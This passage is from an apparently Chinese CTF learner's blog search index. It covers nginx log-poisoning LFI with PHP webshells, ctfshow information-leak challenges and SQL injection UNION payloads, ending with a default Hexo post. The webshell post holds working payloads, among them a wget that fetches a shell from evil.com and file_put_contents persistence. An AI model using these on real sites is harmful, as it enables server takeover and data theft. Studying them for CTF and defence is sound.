&gt;?<br></code></pre></td></tr></table></figure><p>用伪协议：</p><p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,[base64_encode_shell]</p><p><img src="/%5Cimages%5Cweb88-1.png"></p><p>改成base64后没有被过滤的符号的，可以添加echo ‘a’或者&gt;末尾任意添加</p><p><img src="/%5Cimages%5Cweb88-2.png"></p><p>即可得到flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>shell</title>
    <link href="/2025/06/06/shell/"/>
    <url>/2025/06/06/shell/</url>
    
    <content type="html"><![CDATA[<h3 id="深入详解：WebShell-与日志文件包含攻击"><a href="#深入详解：WebShell-与日志文件包含攻击" class="headerlink" title="深入详解：WebShell 与日志文件包含攻击"></a>深入详解：WebShell 与日志文件包含攻击</h3><h4 id="一、什么是-WebShell？"><a href="#一、什么是-WebShell？" class="headerlink" title="一、什么是 WebShell？"></a>一、什么是 WebShell？</h4><p><strong>WebShell 本质</strong>：<br>一个隐藏在网站服务器上的恶意脚本文件，攻击者通过浏览器就能远程控制服务器，就像在服务器内部安装了”遥控器”。</p><p><strong>典型 WebShell 代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>访问方式：<code>http://target.com/shell.php?cmd=ls</code></li><li>效果：服务器会执行<code>ls</code>命令并返回结果</li></ul><p><strong>WebShell 的作用</strong>：</p><ol><li>执行系统命令（查看文件、修改配置）</li><li>上传&#x2F;下载文件</li><li>数据库操作</li><li>内网渗透跳板</li><li>持久化后门（即使漏洞修复仍能控制）</li></ol><h4 id="二、你提供的攻击流程详解"><a href="#二、你提供的攻击流程详解" class="headerlink" title="二、你提供的攻击流程详解"></a>二、你提供的攻击流程详解</h4><h5 id="完整攻击步骤："><a href="#完整攻击步骤：" class="headerlink" title="完整攻击步骤："></a>完整攻击步骤：</h5><pre><code class=" mermaid">graph TDA[污染日志] --&gt; B[包含日志]B --&gt; C[执行代码]C --&gt; D[获取WebShell]D --&gt; E[完全控制服务器]</code></pre><h5 id="详细解析你提供的操作："><a href="#详细解析你提供的操作：" class="headerlink" title="详细解析你提供的操作："></a>详细解析你提供的操作：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?file=/var/log/nginx/access.log&amp;2=system(&#x27;tac /var/www/html/fl0g.php&#x27;);phpinfo();<br></code></pre></td></tr></table></figure><p><strong>步骤分解</strong>：</p><ol><li><p><strong>污染日志（植入代码）</strong><br>首先需要让日志包含PHP代码：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/&lt;?php</span> $_<span class="hljs-keyword">GET</span>[&#x27;2&#x27;]);?&gt; <span class="hljs-string">HTTP/1.1</span><br><span class="hljs-string">Host:</span> target.com<br></code></pre></td></tr></table></figure><p>日志会记录：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">[2025-06-11] &quot;GET /</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> 404 ...</span><br></code></pre></td></tr></table></figure></li><li><p><strong>触发代码执行</strong><br>访问包含漏洞页面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">target.com/vuln.php?file=/var/log/nginx/access.log&amp;2=system(&#x27;tac /var/www/html/fl0g.php&#x27;);phpinfo();<br></code></pre></td></tr></table></figure></li><li><p><strong>服务器实际执行的代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac /var/www/html/fl0g.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>system(&#39;tac ...&#39;)</code>：执行系统命令读取flag文件</li><li><code>phpinfo()</code>：输出PHP配置信息</li></ul></li><li><p><strong>结果定位技巧</strong>：<br>在返回的网页中：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">FLAG</span><span class="hljs-template-variable">&#123;this_is_secret&#125;</span><span class="language-xml">  &lt;-- 命令执行结果</span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>       &lt;-- phpinfo()的起始标签</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>PHP信息<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">...</span><br></code></pre></td></tr></table></figure><p>只需在<code>&lt;!DOCTYPE html&gt;</code>前面查找就能看到命令执行结果</p></li></ol><h4 id="三、如何升级为完整-WebShell"><a href="#三、如何升级为完整-WebShell" class="headerlink" title="三、如何升级为完整 WebShell"></a>三、如何升级为完整 WebShell</h4><h5 id="方法1：直接写入-WebShell"><a href="#方法1：直接写入-WebShell" class="headerlink" title="方法1：直接写入 WebShell"></a>方法1：直接写入 WebShell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?file=/var/log/nginx/access.log&amp;2=file_put_contents(&#x27;shell.php&#x27;,&#x27;&lt;?php system($_GET[0]);?&gt;&#x27;);phpinfo();<br></code></pre></td></tr></table></figure><ul><li>效果：创建 <code>shell.php</code> 后门文件</li><li>使用：<code>http://target.com/shell.php?0=ls</code></li></ul><h5 id="方法2：下载现成-WebShell"><a href="#方法2：下载现成-WebShell" class="headerlink" title="方法2：下载现成 WebShell"></a>方法2：下载现成 WebShell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?file=/var/log/nginx/access.log&amp;2=system(&#x27;wget http://evil.com/shell.txt -O /var/www/html/shell.php&#x27;);phpinfo();<br></code></pre></td></tr></table></figure><h5 id="方法3：使用专业工具连接"><a href="#方法3：使用专业工具连接" class="headerlink" title="方法3：使用专业工具连接"></a>方法3：使用专业工具连接</h5><ol><li>写入 WebShell 后</li><li>使用中国蚁剑&#x2F;冰蝎连接：<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">连接<span class="hljs-built_in">URL</span>：<span class="hljs-keyword">http</span>://target.com/<span class="hljs-built_in">shell</span>.php<br>密码：cmd（根据WebShell代码设定）<br></code></pre></td></tr></table></figure><img src="https://example.com/antsword.jpg" alt="蚁剑界面示例"></li></ol><h4 id="四、为什么需要这样操作？"><a href="#四、为什么需要这样操作？" class="headerlink" title="四、为什么需要这样操作？"></a>四、为什么需要这样操作？</h4><ol><li><p><strong>绕过防御</strong>：</p><ul><li>当直接上传文件被禁止时</li><li>当常见协议（php:&#x2F;&#x2F;, data:&#x2F;&#x2F;）被过滤时</li></ul></li><li><p><strong>隐蔽性强</strong>：</p><ul><li>日志文件是合法系统文件</li><li>不会新增可疑文件（无文件落地）</li></ul></li><li><p><strong>多阶段攻击</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sequence">攻击者-&gt;服务器: 污染日志<br>攻击者-&gt;服务器: 触发包含漏洞<br>服务器--&gt;攻击者: 返回命令结果<br>攻击者-&gt;服务器: 部署WebShell<br>服务器--&gt;攻击者: 持久控制通道<br></code></pre></td></tr></table></figure></li></ol><h4 id="五、实际案例演示"><a href="#五、实际案例演示" class="headerlink" title="五、实际案例演示"></a>五、实际案例演示</h4><p>假设目标网站：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//vuln-site.com/index.php?page=about.php</span><br></code></pre></td></tr></table></figure><p><strong>攻击过程</strong>：</p><ol><li><p>检测LFI漏洞：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>vuln-site.com<span class="hljs-regexp">/index.php?page=/</span>etc/passwd<br></code></pre></td></tr></table></figure></li><li><p>污染日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://vuln-site.com/&lt;?php system(\$_GET[&#x27;exec&#x27;]);?&gt;&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>执行命令（查找flag）：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">http://vuln-site.com/<span class="hljs-built_in">index</span>.php?page=/var/<span class="hljs-built_in">log</span>/nginx/<span class="hljs-keyword">access</span>.<span class="hljs-built_in">log</span>&amp;exec=find / -<span class="hljs-keyword">name</span> flag*<br></code></pre></td></tr></table></figure></li><li><p>结果定位：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">/var/secret/flag.txt  &lt;-- 命令输出<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>       &lt;-- phpinfo起始标记<br></code></pre></td></tr></table></figure></li><li><p>读取flag：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>vuln-site.com<span class="hljs-regexp">/index.php?page=/</span>var<span class="hljs-regexp">/log/</span>nginx<span class="hljs-regexp">/access.log&amp;exec=cat /</span>var<span class="hljs-regexp">/secret/</span>flag.txt<br></code></pre></td></tr></table></figure></li></ol><h4 id="六、防御措施"><a href="#六、防御措施" class="headerlink" title="六、防御措施"></a>六、防御措施</h4><ol><li><p><strong>服务器防护</strong>：</p><ul><li>设置 <code>open_basedir</code> 限制文件访问范围</li><li>禁用危险函数：<code>system, exec, shell_exec</code></li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">disable_functions</span> = system,exec,passthru<br></code></pre></td></tr></table></figure></li><li><p><strong>日志安全</strong>：</p><ul><li>将日志移出Web目录</li><li>设置日志文件不可执行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chattr +i /var/log/nginx/access.log<br></code></pre></td></tr></table></figure></li><li><p><strong>代码层面</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 安全的文件包含</span><br><span class="hljs-variable">$allowed</span> = [<span class="hljs-string">&#x27;about&#x27;</span>,<span class="hljs-string">&#x27;contact&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>], <span class="hljs-variable">$allowed</span>)) &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>].<span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>入侵检测</strong>：</p><ul><li>监控异常日志条目（包含<code>&lt;?php</code>的请求）</li><li>使用WAF过滤包含特殊字符的请求</li></ul></li></ol><p>这种攻击方式巧妙利用了服务器自身的日志功能，即使在没有文件上传漏洞的情况下也能实现完全控制，是LFI漏洞中最危险的利用方式之一。</p><p>直接通过get请求写马会导致代码被URL编码，导致日志中存储的是编码后的文本，不是可执行代码。UA头不会被编码</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>信息搜集</title>
    <link href="/2025/06/04/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2025/06/04/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>网站根目录下存在robots.txt文件，其内容规定了网络爬虫可爬和不可爬的目录文件。</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p><strong>phps文件</strong>就是php的源代码文件，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。</p><p>因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。直接访问&#x2F;index.phps即可获得php</p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>www源码泄露</p><p>访问url&#x2F;<a href="http://www.zip,通过其源码泄露,发现index.php文件/">www.zip，通过其源码泄露，发现index.php文件</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-01 14:37:13</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-01 14:42:44</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//flag in fl000g.txt</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;web6:where is flag?&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>fl000g.txt里显示flag{flag_here}，尝试直接url&#x2F;fl000g.txt，得到flag</p><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><blockquote><p>版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>开发人员在开发时，常常会先把源码提交到远程托管网站（如github），最后再从远程托管网站把源码pull到服务器的web目录下，如果忘记把.git文件删除，就造成此漏洞。利用.git文件恢复网站的源码，而源码里可能会有数据库的信息。<br>当前大量开发人员使用git进行版本控制，对站点自动部署。 如果配置不当，可能会将.git文件夹直接部署到线上环境，这就引起了git泄露漏洞。</p><p>尝试&#x2F;.git得到flag</p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>主流的版本控制器有git和svn，访问&#x2F;.svn得到flag</p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><blockquote><p>发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p></blockquote><p>在Linux生产环境上使用vim或者vi做修改时，会生成一个swp为后缀的文件.</p><ul><li>第一次意外退出生成的是.swp</li><li>第二次意外退出生成的是.swo</li><li>第三次为.swn</li></ul><p>访问&#x2F;index.php.swp获得带有flag的文件</p><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><blockquote><p>有时候网站上的公开信息，就是管理员常用密码</p></blockquote><p>访问&#x2F;admin，弹出登陆界面，账号用admin，密码从网站里找</p><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><blockquote><p>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p></blockquote><p>访问&#x2F;editor，是文件上传界面，点击文件空间，从var&#x2F;www&#x2F;html找到nothinghere，点进去是fl000g.txt，访问&#x2F;nothinghere&#x2F;fl000g.txt得到flag</p><h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><blockquote><p>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p></blockquote><p>登录界面找回密保问题，通过文章里的qq邮箱得到居住地，成功找回密码。</p><h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><blockquote><p>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p></blockquote><p>访问tz.php找到flag</p><h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><blockquote><p>备份的sql文件会泄露敏感信息</p></blockquote><p>扫到backup.sql得到flag</p><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><blockquote><p>玩101分给你flag</p></blockquote><p>找到js文件，看见大于100分输出的字符串，解码获得flag</p><h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p>mdb文件从txt打开，虽然是乱码也可以搜到flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/06/02/%E6%B5%8B%E8%AF%95/"/>
    <url>/2025/06/02/%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="无过滤注入"><a href="#无过滤注入" class="headerlink" title="无过滤注入"></a>无过滤注入</h1><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p><img src="/images/web171.jpg"></p><ol><li><strong>闭合单引号</strong>：通过输入<code>&#39;</code>闭合id参数的单引号。</li><li><strong>注入UNION查询</strong>：使用<code>UNION SELECT</code>获取其他数据，确保列数与原查询一致。</li><li><strong>绕过原查询条件</strong>：直接查询username为’flag’的记录，因为UNION后的SELECT不受原查询的<code>username != &#39;flag&#39;</code>限制。</li><li><strong>注释剩余部分</strong>：使用<code>--</code>注释掉原SQL的剩余部分，避免语法错误。</li></ol><p>观察到有三列，两种解发均可，后者会带出id&#x3D;1的那一行，没啥作用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; union select username,password,1 from ctfshow_user where username=&#x27;</span>flag<span class="hljs-string">&#x27; -- </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> username,password,<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p> <strong>注释符的区别</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/05/29/hello-world/"/>
    <url>/2025/05/29/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
